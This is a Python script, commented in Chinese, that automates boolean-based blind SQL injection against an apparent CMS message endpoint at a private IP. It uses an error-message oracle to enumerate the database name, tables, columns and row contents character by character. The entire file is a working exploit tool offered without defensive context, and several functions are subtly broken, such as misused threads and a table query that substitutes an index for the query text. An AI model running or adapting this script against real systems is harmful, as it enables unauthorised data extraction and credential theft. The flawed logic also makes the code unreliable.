import requests
import threading
import binascii


# 获得数据长度
def datacount(url, a):
    payload = '{0}/admin/index.php?m=web&n=message&c=message&a=domessage&action=add&lang=cn&para137=1&para186=1&para138=1&para139=1&para140=1&id=42 and (length(({1}))={2})'
    i = 0  # 初始化数值
    while True:
        post_rul = payload.format(url, a, i)
        print(post_rul)
        try:
            response = requests.get(url=post_rul, headers=headers)
        except:
            continue
        if '验证码错误！' in response.text:  # 判断是否回显
            print('长度为：%d' % i)
            return i
        else:
            i = i + 1
            continue


# 获得数据库名长度
def get_databasecount(url):
    payload = '{0}/message/index.php?m=web&n=message&c=message&a=domessage&action=add&lang=cn&para137=1&para186=1%40qq.com' \
              '&para138=1&para139=1&para140=1&id=42' \
              ' and length(database())={1}'
    i = 0  # 初始化数值
    while True:
        post_rul = payload.format(url, i)
        try:
            response = requests.get(url=post_rul, headers=headers)
        except:
            continue
        if '验证码错误！' in response.text:  # 判断是否回显
            print('数据库名长度为：%d' % i)
            return i
        else:
            i = i + 1
            continue


# 数据库名
def get_database(url, curr, asc):
    payload = '{0}/message/index.php?m=web&n=message&c=message&a=domessage&action=add&lang=cn&para137=1&para186=1%40qq.com&para138=1&para139=1&para140=1&id=42 and ascii(substr(database(),{1},1))={2}'
    url1 = payload.format(url, curr, asc)
    try:
        reponse = requests.get(url=url1, headers=headers)
    except:
        pass
    if '验证码错误！' in reponse.text:
        tmp1 = chr(asc)
        tmp.append(tmp1)
        print('数据库名为：' + ''.join(str(i) for i in tmp))


# table数量
def get_tablecount(url):
    payload = '{0}/admin/index.php?m=web&n=message&c=message&a=domessage&action=add&lang=cn&para137=1&para186=1&para138=1&para139=1&para140=1&id=42 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {1},1),1,1))>=109'
    i = 1
    while True:
        url1 = payload.format(url, i)

        try:
            page = requests.get(url=url1, headers=headers)
        except:
            continue
        if '验证码错误！' not in page.text:
            payload = '{0}/admin/index.php?m=web&n=message&c=message&a=domessage&action=add&lang=cn&para137=1&para186=1&para138=1&para139=1&para140=1&id=42 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {1},1),1,1))<109'
            url2 = payload.format(url, i)
            page1 = requests.get(url=url2, headers=headers)
            if '验证码错误！' not in page1.text:
                print('数据库中一共有%d张表' % i)
                return i
        else:
            i = i + 1
            continue


# 获得table
# 不建议使用特别耗时间，可能有更好的做法
def get_tables(url):
    payload = '{0}/admin/index.php?m=web&n=message&c=message&a=domessage&action=add&lang=cn&para137=1&para186=1&para138=1&para139=1&para140=1&id=42 and ascii(substr(({1}),{2},1))={3}'
    i = 0
    # 定义两个列表，将猜测出来的值进行转存
    tmp1 = []
    p = []
    while True:
        c = 'select table_name from information_schema.tables where table_schema=database() limit {0},1'
        d = int(datacount(url, c.format(i)))
        for a in range(1, d + 1):  # 这里的a的值为表的长度，可以更改
            for b in range(48, 123):
                url1 = payload.format(url, i, a, b)
                try:
                    page = requests.get(url=url1, headers=headers)
                except:
                    continue
                if '验证码错误！' in page.text:
                    tmp = chr(b)  # 获得表第a个的字符
                    tmp1.append(tmp)  # 将表第a个字符储存到tmp1的列表中
                elif a == d and b == 122:  # 判断当a为最后一个以及最后一个猜测值时
                    i = i + 1  # 换下一张表
                    p1 = ''.join(tmp1)
                    p.append(p1)  # 将第i张表的全部名储存到列表p中
                    del tmp1[:]
                    print(p)
                    continue
                elif i >= int(get_tablecount(url)):
                    return p  # 返回列表


# table中字段数量
def colunmscount(url, colunm):
    payload = '{0}/admin/index.php?m=web&n=message&c=message&a=domessage&action=add&lang=cn&para137=1&para186=1&para138=1&para139=1&para140=1&id=42 and (select count(column_name) from information_schema.columns where table_name={1})={2}'
    i = 0
    while True:
        url = payload.format(url, colunm, i)
        try:
            page = requests.get(url=url, headers=headers)
        except:
            continue
        if '验证码错误！' in page.text:
            return i
        else:
            i = i + 1
            continue


# 获得table下的列
def get_colunms(url):
    table1 = input("请输入想要查询的表名：")
    ku1 = input("相对于的数据库名：")
    payload = '{0}/admin/index.php?m=web&n=message&c=message&a=domessage&action=add&lang=cn&para137=1&para186=1&para138=1&para139=1&para140=1&id=42 and (ascii(substr(({1}),{2},1)))={3}'
    tmp1 = []
    get = []
    table = binascii.hexlify(table1.encode())
    ku = binascii.hexlify(ku1.encode())
    a = 0
    while True:
        c = 'select column_name from information_schema.columns where table_name=0x{0} and table_schema=0x{1} limit {2},1'
        d = int(datacount(url, c.format(table.decode(), ku.decode(), a)))
        for b in range(1, d + 1):
            for i in range(48, 123):
                url1 = payload.format(url, c.format(table.decode(), ku.decode(), a), b, i)

                try:
                    page = requests.get(url=url1, headers=headers)
                except:
                    pass
                if '验证码错误！' in page.text:
                    tmp = chr(i)
                    tmp1.append(tmp)
                    print(''.join(tmp1))
                elif b == d and i == 122:
                    a = a + 1
                    get.append(tmp1)
                    del tmp1[:]
                    continue
                elif a == int(colunmscount(url, table.decode())) + 1:
                    return get


# 获得列下的数据
def get_pass(url, curr, asc):
    table = input("输入想查询的表：")
    id = input("输入表中的id:")
    tmp = []
    payload = "{0}/admin/index.php?m=web&n=message&c=message&a=domessage&action=add&lang=cn&para137=1&para186=1&para138=1&para139=1&para140=1&id=42 and(ascii(substr((select {1} from {2} limit 0,1),{3},1)))={4}"
    url = payload.format(url, id, table, curr, asc)
    try:
        page = requests.get(url=url, headers=headers)
    except:
        pass
    if '验证码错误！' in page.text:
        tme = chr(asc)
        tmp.append(tme)
        print(''.join(tmp))


if __name__ == '__main__':
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'}
    url = "http://192.168.6.208"
    get_databasecount(url)
    tmp = []
    threadList = []
    for i in range(1, int(get_databasecount(url)) + 1):
        for a in range(48, 123):
            threadList.append(threading.Thread(target=get_database(url, i, a)))
            threadList.append(threading.Thread(target=get_pass(url, i, a)))
    for t in threadList:
        t.start()
        while True:
            if (len(threading.enumerate()) < 50):
                break
